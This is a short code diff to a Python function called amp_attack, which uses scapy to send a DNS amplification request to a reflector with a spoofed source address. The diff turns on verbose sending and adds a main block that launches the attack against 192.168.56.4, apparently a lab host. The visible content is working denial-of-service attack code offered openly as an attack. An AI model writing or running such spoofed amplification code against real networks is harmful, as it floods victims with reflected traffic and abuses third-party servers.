@@ -42,5 +42,9 @@ def amp_attack(reflector, victim=None, service="DNS", port=None):
         case _:
             raise ValueError(f"Unsupported service: {service}")
 
-    scapy.send(pkt, verbose=0)
+    scapy.send(pkt, verbose=1)
     print(f"Sent {service} amplification request to {reflector} (spoofed source: {src_ip})")
+
+if __name__ == "__main__":
+    amp_attack("192.168.56.4", service="DNS")
+
